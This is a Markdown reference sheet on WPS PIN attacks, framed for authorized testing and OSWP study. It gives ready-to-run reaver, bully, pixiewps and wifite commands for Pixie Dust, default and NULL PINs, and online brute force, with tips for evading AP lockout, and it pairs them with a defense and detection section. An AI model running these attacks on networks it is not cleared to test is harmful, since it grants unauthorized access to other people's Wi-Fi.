# WPS PIN Brute Force — reaver, bully, pixiewps

> **Scope & authorization.** This reference is for **authorized** Wi-Fi security testing only:
> your own gear, a lab you own, sanctioned competitions/CTFs, or OSWP (PEN-210) study on
> networks you have **written permission** to test. WPS PIN recovery yields the WPA/WPA2
> PSK — i.e. full network access — so it is unauthorized-access territory anywhere else.
> Every attack section below is paired with its **defense**. Keep an allowlist of BSSIDs you
> are cleared to touch and gate every command on it.
>
> Target rig assumed by this doc: **Mac host + Kali (VM or bare) + TP-Link RTL8188EUS
> (2.4 GHz only)** adapter in monitor mode. WPS is a 2.4 GHz feature on the vast majority of
> APs, so a 2.4 GHz adapter is sufficient; `-5`/`--5ghz` flags below are noted only for
> completeness.

---

## 1. Concept (brief)

Wi-Fi Protected Setup (WPS) lets a client ("enrollee") join an AP ("registrar") using an
**8-digit PIN** instead of the WPA passphrase. Two design flaws make it attackable:

1. **Split-half validation + checksum (Viehböck, Dec 2011).** The 8th digit is a checksum
   of the first 7, so only 7 digits are unknown (10^7). Worse, the AP validates the PIN in
   **two halves** and tells the enrollee (via the M4/M6 EAP messages) when the **first half**
   is correct *before* the second half is sent. That collapses the keyspace:
   - first half = 4 digits → **10,000** guesses
   - second half = 3 unknown digits (the 4th is the checksum) → **1,000** guesses
   - worst case **≈ 11,000** attempts (avg ~5,500), hours of online guessing.
   The checksum itself (from hostap `wps_pin_checksum`): weighted sum, odd positions ×3,
   then `(10 - (sum % 10)) % 10`.

2. **Pixie Dust / offline PIN recovery (Dominique Bongard, 2014).** During the exchange the
   AP sends `E-Hash1`/`E-Hash2`, which commit to the PIN halves but are masked by two secret
   nonces `E-S1`/`E-S2`. On APs with a **weak/zero PRNG**, those nonces are predictable (or
   literally `0`), so the PIN is brute-forced **offline from a single handshake** — seconds
   to minutes, no lockout, no per-PIN rate limit.

3. **Default/derived PINs.** Many vendors derive the factory WPS PIN from the **BSSID** (or
   WAN MAC / serial). If you know the algorithm for that model, you skip brute force entirely
   and try 1 PIN.

Online brute force (reaver/bully) exploits flaw #1. Pixie Dust (pixiewps, driven by reaver
`-K` / bully `-d`) exploits #2. Default-PIN lookup exploits #3. **Pros try #2 and #3 first**
because they are fast and dodge lockout; online brute force is the slow fallback.

---

## 2. Decision order (what a pro tries, fastest → slowest)

```
1. wash scan        → identify WPS APs, note Lck (locked?) and vendor
2. Pixie Dust (-K)  → ~seconds–minutes IF chipset has weak nonce; no lockout risk
3. Default PIN      → derive from BSSID (ComputePIN/EasyBox/etc.), try 1 PIN
4. Known-PIN list   → vendor default DB (reaver/wifite ship these)
5. NULL PIN         → some APs accept empty PIN (-p '')
6. Online brute     → reaver/bully full 11k keyspace; hours; triggers lockout → tune timing
```

Automation wrapper (`wifite`) runs 2→6 in roughly this order by default.

---

## 3. Setup — interface & monitor mode (Kali)

```bash
# 0. Identify the adapter (RTL8188EUS shows as wlan0/wlan1)
iw dev
airmon-ng

# 1. Kill interfering processes (NetworkManager/wpa_supplicant grab the radio)
sudo airmon-ng check kill          # or: sudo systemctl stop NetworkManager

# 2a. Preferred: airmon-ng creates a monitor vif (often wlan0mon)
sudo airmon-ng start wlan0
iw dev                             # confirm the monitor interface name

# 2b. Fallback (driver-agnostic, works well for RTL8188EUS):
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
iw wlan0 info                      # type should read 'monitor'
```

- Throughout this doc `$IFACE` = your monitor interface (`wlan0mon` or `wlan0`),
  `$BSSID` = target AP MAC, `$CH` = its channel.
- RTL8188EUS note: the in-kernel `r8188eu`/`8188eu` driver supports monitor + injection on
  modern Kali; if injection flakes, test with `aireplay-ng --test $IFACE` and, if needed,
  use the `aircrack-ng/rtl8188eus` DKMS driver. It is **2.4 GHz only** — fine for WPS.

---

## 4. Recon — find WPS APs with `wash`

`wash` ships with reaver and flags which APs have WPS and whether it is **locked**.

```bash
sudo wash -i $IFACE                 # survey mode (default)
sudo wash -i $IFACE -c 6            # lock to one channel (less missed packets)
sudo wash -i $IFACE -5             # 5 GHz (only if adapter supports it)
sudo wash -i $IFACE -j             # extended WPS info as JSON (scriptable → allowlist)
sudo wash -i $IFACE -a             # show all APs, incl. non-WPS
```

Output columns: `BSSID | Ch | dBm | WPS (version) | Lck | Vendor | ESSID`.

- **`Lck = No`** → WPS open to attempt. **`Lck = Yes`** → AP is in lockout; online brute
  will stall (Pixie Dust may still work — it is offline).
- Signal matters: aim for **≥ −70 dBm**. Weak signal = timeouts, NACKs, and false lockouts.
- `wash` version flags vary; confirm with `wash -h` (seen in docs: `-i -f -c -n -O -F -2 -5
  -s -u -a -j -U -p`). The older `-C` column flag in some tutorials is not in current help.

---

## 5. Pixie Dust (offline) — **try this first**

Fast, no lockout, needs only one WPS exchange. Works only on weak-nonce chipsets.

### 5a. Driven by reaver (automatic — recommended)

```bash
# Reaver captures M1–M3, extracts the values, and calls pixiewps for you:
sudo reaver -i $IFACE -b $BSSID -c $CH -K 1 -vv
# equivalents / useful adds:
sudo reaver -i $IFACE -b $BSSID -c $CH -K 1 -N -vv        # -N = don't send NACKs (more stable)
sudo reaver -i $IFACE -b $BSSID -c $CH -K 1 -N -L -vv     # -L = ignore AP 'locked' state
```

- `-K` / `-Z` / `--pixie-dust` = run Pixie Dust. (`-K 1` is the common form in guides; `-K`
  alone works on current builds.)
- **Realtek (RTL819x) targets: do NOT add `-S`/`--dh-small`.** Small-DH changes the key
  material and breaks the Realtek (mode 3) pixiewps path. For Ralink/MediaTek, `-S` is fine
  and speeds things up.
- On success reaver prints `WPS PIN`, `WPA PSK`, and `AP SSID`. Done — no online phase needed.

### 5b. Manual pixiewps (when you captured values yourself / with bully)

Reaver (or bully with `-d`) prints `PKE`, `PKR`, `E-Hash1`, `E-Hash2`, `AuthKey`,
`E-Nonce`, `R-Nonce`, `E-BSSID`. Feed them to pixiewps:

```bash
pixiewps --pke <PKE> --pkr <PKR> \
         --e-hash1 <E-Hash1> --e-hash2 <E-Hash2> \
         --authkey <AuthKey> --e-nonce <E-Nonce>
# short form:
pixiewps -e <PKE> -r <PKR> -s <E-Hash1> -z <E-Hash2> -a <AuthKey> -n <E-Nonce>
```

pixiewps option reference (from the man page):

| Flag | Long | Meaning |
|------|------|---------|
| `-e` | `--pke` | Enrollee DH public key (from **M1**) — required |
| `-r` | `--pkr` | Registrar DH public key (from **M2**); omit if small-DH used both sides |
| `-s` | `--e-hash1` | Enrollee hash-1 (from **M3**) — required |
| `-z` | `--e-hash2` | Enrollee hash-2 (from **M3**) — required |
| `-a` | `--authkey` | Auth session key; needs patched reaver/bully, or derive via small-DH + nonces |
| `-n` | `--e-nonce` | Enrollee nonce (from **M1**) — required |
| `-m` | `--r-nonce` | Registrar nonce (from **M2**) |
| `-b` | `--e-bssid` | Enrollee BSSID |
| `-S` | `--dh-small` | Small DH keys (reaver ≥1.3 must match; not valid with mode 3) |
| `--mode N[,…]` | | Attack mode(s): **1** RT/MT, **2** eCos simple, **3** RTL819x, 4/5 experimental |
| `--start`/`--end` | | Date window `[mm/]yyyy` for mode 3 (RTL timestamp-seeded PRNG) |
| `-v` | `--verbosity` | 1–3 |

- If you don't pin `--mode`, pixiewps tries the standard modes automatically.
- **RTL819x (mode 3)** seeds its PRNG from the boot time; `--start`/`--end` narrow the
  timestamp search (e.g. `--start 01/2015 --end 12/2020`). Mode 3 is incompatible with `-S`.

### 5c. Chipset susceptibility (why it works / fails)

- **Ralink / MediaTek / Celeno (rebadged Ralink):** `E-S1`/`E-S2` are effectively **always
  0** — only the PIN needs brute-forcing → trivially vulnerable (mode 1).
- **Broadcom, some Realtek:** weak PRNG, often recoverable (Realtek → mode 3 + date window).
- **Properly randomized nonces (good firmware):** Pixie Dust **fails** — fall back to online.
- Reality check: a 2025 study still found current shipping models vulnerable a decade on, but
  many modern APs are patched — don't assume success; measure.

---

## 6. Default / derived PIN (try before/with online brute)

Many factory PINs are a deterministic function of the **BSSID**. If you know the algorithm
for the target model, it's a 1-PIN attempt.

```bash
# Try a specific derived/known PIN directly:
sudo reaver -i $IFACE -b $BSSID -c $CH -p 12345670 -vv

# reaver's built-in default-PIN generators (vendor-specific):
sudo reaver -i $IFACE -b $BSSID -c $CH -W1 -vv    # 1=Belkin  2=D-Link  3=Zyxel
```

Known default-PIN algorithm families (public research — for models you own/are cleared to test):

- **ComputePIN** — derives PIN from the last 3 BSSID octets (broad family of D-Link/others).
- **Vodafone/Arcor EasyBox 802/803** (SEC Consult 2013) — PIN from **MAC + serial**, and the
  serial is itself derivable from the MAC. Vendor shipped no fix → "disable WPS" was the advice.
- **D-Link** — most models derive from BSSID; some (e.g. DIR-810L) from the **WAN MAC**
  (off-by-a-few from the BSSID) — try BSSID ±1/±2 on the last octet.
- **TRENDnet TEW-818RDU** — static PIN from the 2.4 GHz BSSID, shared across 2.4/5 GHz radios.
- Community generators (e.g. WPS-pin-generator projects) bundle many of these; wifite can call
  them. Validate against gear you own; don't point them at third-party networks.

Online databases of per-BSSID "3WiFi"-style PINs exist but are out of scope here (and legally
fraught) — derive locally from the published algorithms for your own devices instead.

### NULL PIN

Some early/poor implementations accept an **empty** PIN and hand over the PSK:

```bash
sudo reaver -i $IFACE -b $BSSID -c $CH -f -N -g 1 -vv -p ''
# -g 1 = one attempt, -f = no channel hop, -N = no NACKs
```

Bully does **not** support the NULL-PIN case; use reaver.

---

## 7. Online PIN brute force (the slow fallback)

### 7a. reaver

```bash
# Baseline:
sudo reaver -i $IFACE -b $BSSID -c $CH -vv

# Hardened/robust run (good general-purpose starting flags):
sudo reaver -i $IFACE -b $BSSID -c $CH -vv \
            -N \            # don't send NACKs for out-of-order pkts
            -L \            # ignore AP's locked state (keep trying)
            -d 15 \         # 15s delay between PIN attempts (evade lockout/rate-limit)
            -T 2 \          # M5/M7 timeout 2s (slow/laggy APs; default 0.4)
            -r 3:60 \       # sleep 60s every 3 attempts (recurring delay)
            -x 60 \         # sleep 60s after 10 unexpected failures
            -S              # small DH keys = faster (OMIT on Realtek/Pixie)
```

Key reaver flags (from the Kali tool page):

| Flag | Long | Purpose |
|------|------|---------|
| `-i` | `--interface` | monitor-mode iface (required) |
| `-b` | `--bssid` | target BSSID (required) |
| `-c` | `--channel` | lock channel (implies `-f`) |
| `-e` | `--essid` | target ESSID (needed if hidden) |
| `-p` | `--pin` | try a specific 4/8-digit PIN (or `''` for null) |
| `-K`/`-Z` | `--pixie-dust` | run Pixie Dust offline attack |
| `-d` | `--delay` | seconds between PIN attempts (default 1) |
| `-l` | `--lock-delay` | wait when AP locks WPS (default 60) |
| `-g` | `--max-attempts` | quit after N attempts |
| `-x` | `--fail-wait` | sleep after 10 unexpected failures |
| `-r` | `--recurring-delay` | `x:y` → sleep y s every x attempts |
| `-t` | `--timeout` | receive timeout (default 10) |
| `-T` | `--m57-timeout` | M5/M7 timeout (default 0.40) |
| `-N` | `--no-nacks` | don't send NACKs (more stable on many APs) |
| `-S` | `--dh-small` | small DH keys (faster; **not** on Realtek/Pixie) |
| `-L` | `--ignore-locks` | ignore AP locked state |
| `-A` | `--no-associate` | skip association (pair with external `aireplay-ng`) |
| `-E` | `--eap-terminate` | end each session with EAP-FAIL (flaky APs) |
| `-J` | `--timeout-is-nack` | treat timeout as NACK (DIR-300/320) |
| `-w` | `--win7` | mimic a Win7 registrar (some APs demand it) |
| `-f` | `--fixed` | disable channel hopping |
| `-m` | `--mac` | spoof host MAC |
| `-s` | `--session` | restore a saved session |
| `-o` | `--out-file` | log to file |
| `-C` | `--exec` | run a command on success (e.g. save PSK) |
| `-5` | `--5ghz` | use 5 GHz channels |
| `-vv`/`-vvv` | `--verbose` | verbosity |

**Session resume:** reaver auto-saves progress to `/etc/reaver/<BSSID>.wpc` (or `/var/lib/
reaver`, build-dependent). Ctrl-C and resume later with the same command, or
`-s /etc/reaver/<BSSID>.wpc`. It restarts mid-keyspace, not from zero — essential for the
hours-long online attack.

### 7b. bully (alternative engine — more resilient on some APs)

```bash
# Online PIN brute (note: iface is POSITIONAL in bully):
sudo bully $IFACE -b $BSSID -c $CH -S -F -B -v 3
# Pixie Dust with bully:
sudo bully $IFACE -b $BSSID -c $CH -d -v 3
```

Key bully flags:

| Flag | Long | Purpose |
|------|------|---------|
| `-b` | `--bssid` | target BSSID |
| `-c` | `--channel` | channel |
| `-e` | `--essid` | target ESSID |
| `-p` | `--pin` | start/seed PIN |
| `-d` | `--pixiewps` | run Pixie Dust (drives pixiewps) |
| `-B` | `--bruteforce` | brute the checksum digit instead of computing it (non-compliant APs) |
| `-S` | `--sequential` | sequential PINs (don't randomize) |
| `-F` | `--force` | continue despite warnings |
| `-L` | `--lockignore` | ignore lockouts |
| `-T` | `--test` | test mode, inject nothing |
| `-v` | `--verbosity` | 1–3 |

Pros keep both installed: if reaver stalls on a given AP (association drops, constant
timeouts), bully often behaves differently and vice-versa. `wifite --bully` / `--reaver`
switches engines.

### 7c. Full automation — `wifite`

```bash
sudo wifite --wps-only               # only WPS targets
sudo wifite --wps-only --pixie       # Pixie Dust only (fast triage across many APs)
sudo wifite --wps-only --no-pixie    # online PIN only
sudo wifite --bully                  # use bully instead of reaver for WPS
sudo wifite --pixiet 180             # Pixie Dust timeout (default 300s)
```

wifite auto-selects/monitors the adapter, scans, tries Pixie Dust → known/NULL PIN → online
brute, and saves cracked keys to `cracked.txt`. Great for triaging a lab of many APs.

---

## 8. After the PIN: getting the PSK

Reaver/bully print the **WPA PSK** directly once the PIN is found — no separate crack needed:

```
[+] WPS PIN: '12345670'
[+] WPA PSK: 'yourlabpassphrase'
[+] AP SSID: 'LAB_AP'
```

- Save it on success: add `-o loot_$BSSID.txt` or `-C "echo FOUND >> psk.log"`.
- If the AP returns the PIN but not the PSK (rare EAP quirk), re-run `reaver -p <foundPIN>`
  to complete the exchange and dump the key.
- Validate out-of-band by connecting a lab client, or confirm against the config of the AP
  you own.

---

## 9. Gotchas & pitfalls

- **WPS lockout (`WSC NACK` floods / `Lck=Yes`).** After ~10 failed PINs many APs lock WPS
  for minutes to hours (some never auto-unlock without a reboot). Symptoms: reaver prints
  `WARNING: Detected AP rate limiting` and stalls. Mitigations: `-L`/`--ignore-locks`, raise
  `-d` (e.g. `-d 15..60`), use `-r x:y` recurring sleeps, or switch to Pixie Dust (offline,
  unaffected). Lockout **does not** stop Pixie Dust.
- **Realtek + `-S` = broken Pixie.** Never combine small-DH with a Realtek (mode 3) target.
- **Association / channel drift.** If reaver can't associate, add `-A` and inject with
  `aireplay-ng -1 ... ` separately, or try `-c $CH -f` to pin the channel. Channel hopping
  on a crowded band causes missed M-messages.
- **Weak signal → false lockouts & NACKs.** Get closer / better antenna; target ≥ −70 dBm.
- **`-N` helps more than it hurts** on many APs (don't send NACKs → fewer resets).
- **Hidden ESSID:** supply `-e <ESSID>`; reaver needs it for some registrars.
- **Powersave kills captures:** `sudo iw dev $IFACE set power_save off`.
- **`airmon-ng check kill` first** — a lingering wpa_supplicant/NetworkManager silently steals
  the radio and you'll see "could not associate" forever.
- **Checksum-evasion APs:** some APs reject the computed checksum digit; use bully `-B` to
  brute that digit too.
- **MAC/`-M` churn:** the t6x reaver fork offers `-M` (change last MAC digit per attempt) to
  dodge some rate limiters; costs reliability — use only if lockout is otherwise fatal.
- **Flag drift across builds.** The t6x fork, Kali's package, and upstream differ. Always
  confirm with `reaver -h` / `bully -h` / `man pixiewps` on the installed version.

---

## 10. Pro tips for speed

1. **Pixie Dust before anything else.** Seconds vs. hours, and no lockout. Triage a whole lab
   with `wifite --wps-only --pixie` first, then hand-run survivors.
2. **Default/known/NULL PIN before full brute.** `-W1/2/3`, derived-from-BSSID, and `-p ''`
   are all single-attempt shots.
3. **Lock the channel** (`-c $CH`, implies `-f`) to stop channel-hop packet loss.
4. **Tune timing to the AP, not to a template.** Start aggressive (`-d 0..1`); the moment you
   see rate-limiting, back off (`-d 15`, `-r 3:60`, `-x 60`). Over-delaying a non-limiting AP
   just wastes hours.
5. **`-S` (small DH) speeds online brute** on non-Realtek targets — keep it off for Pixie.
6. **Always run with a session file** so a dropped run resumes mid-keyspace.
7. **Keep reaver AND bully** — swap engines when one misbehaves on a stubborn AP.
8. **Good RF beats clever flags:** position, antenna, and `power_save off` remove most
   "mysterious" failures.

---

## 11. DEFENSE (pair every attack with this)

**For the AP owner / blue team:**

- **Disable WPS entirely.** This is the only complete fix for all three attack classes
  (online brute, Pixie Dust, default-PIN). Do it in firmware, not just the status LED.
- **Verify it's actually off.** On some routers the WPS toggle disables the button/LED but the
  PIN method stays live. Confirm from the attacker's side: `wash -i $IFACE` should show the
  BSSID **absent** from the WPS list (or not at all). If it still appears, WPS is live.
- **Patch firmware.** For Pixie Dust specifically, the fix is proper nonce randomization —
  only firmware updates deliver it. If no patch exists for the model, disable WPS as above.
- **Replace gear with no WPS-off option.** A decade-old study and a 2025 follow-up both found
  shipping models where WPS can't be meaningfully disabled — treat those as unfixable and
  retire them.
- **Lockout is only a speed bump.** Aggressive lockout (lock WPS after a few failures, long
  cooldown) slows *online* reaver/bully but **does nothing against Pixie Dust** (offline) or a
  correct **default PIN** (one attempt). Don't rely on it.
- **Change the default PIN** if the model derives it from the BSSID and you can't disable WPS —
  but this is weak mitigation; disabling WPS is the real control.

**For the blue team / detection (defense-aware, no attacker tooling):**

- **Monitor for WPS brute-force signatures:** a burst of EAP-WSC / M1–M4 exchanges from one
  station, repeated `WSC_NACK`, and rapid PIN-attempt cadence. WIDS/WIPS (e.g. Kismet alerts,
  AP vendor rogue/anomaly detection) can flag this.
- **Alert on lockout events** in AP logs — repeated WPS lockouts usually mean an active attack.
- **Rogue-AP / evil-twin note (detection & concept only).** WPS cracking is sometimes a step
  toward an evil-twin (clone SSID/BSSID, lure clients). **Defense is detection**, not building
  a clone: watch for a second BSSID advertising your ESSID, unexpected deauth floods, and
  signal/channel anomalies via a WIDS such as Kismet or your AP's rogue-AP detection. This doc
  does **not** cover building a credential-harvesting portal — only recognizing and defending
  against the technique.

---

## Sources

Official tool docs / man pages:
- Kali — reaver tool page: https://www.kali.org/tools/reaver/
- Kali — bully tool page: https://www.kali.org/tools/bully/
- Kali — pixiewps tool page: https://www.kali.org/tools/pixiewps
- pixiewps man page (Debian): https://manpages.debian.org/stretch/pixiewps/pixiewps.1.en.html
- reaver man page (Debian/Arch): https://man.archlinux.org/man/reaver.1.en.txt
- reaver-wps-fork-t6x (community fork, Pixie Dust) README: https://github.com/t6x/reaver-wps-fork-t6x
- bully upstream README (Debian): https://sources.debian.org/src/bully/1.4.00-2/README.md
- wifite2 (automation) README: https://github.com/derv82/wifite2

Protocol / algorithm / research:
- hostap `wps_common.c` (PIN checksum `wps_pin_checksum`): https://fuchsia.googlesource.com/third_party/hostap/+/upstream/android-m/src/wps/wps_common.c
- Viehböck, "Brute forcing Wi-Fi Protected Setup" (2011) — split-half + 11,000 bound: https://www.dais.unive.it/~maccari/files/bibliography/Maccari2013ReBreaking.pdf
- Pixie Dust (Bongard) mechanism, E-S1/E-S2 nonces, chipset modes: https://gengstah.github.io/wiki/attacks/pixie-dust-wps/
- Kali forums — Pixie Dust nonce behavior (Ralink/MediaTek/Celeno = 0 nonces): https://forums.kali.org/showthread.php?p=41482

Default-PIN algorithm research:
- SEC Consult — Vodafone/Arcor EasyBox default WPS PIN from MAC+serial: https://packetstormsecurity.com/files/122698/Vodafone-EasyBox-Default-WPS-PIN-Algorithm-Weakness.html
- Reversing D-Link's WPS PIN algorithm (BSSID/WAN-MAC derivation): https://rstforums.com/forum/topic/87138-reversing-d-link%E2%80%99s-wps-pin-algorithm
- TRENDnet TEW-818RDU static WPS PIN disclosure: https://packetstormsecurity.com/files/132477/TRENDnet-TEW-818RDU-PIN-Disclosure.html

Workflow / defense:
- thehacker.recipes — WPS attack workflow (wash/reaver/bully/pixie/null-PIN, "disable WPS"): https://thehacker.recipes/radio/wi-fi/wps/
- SecurityWeek — decade-old Pixie Dust still impacts many devices (2025 NetRise study): https://www.securityweek.com/decade-old-pixie-dust-wi-fi-hack-still-impacts-many-devices/
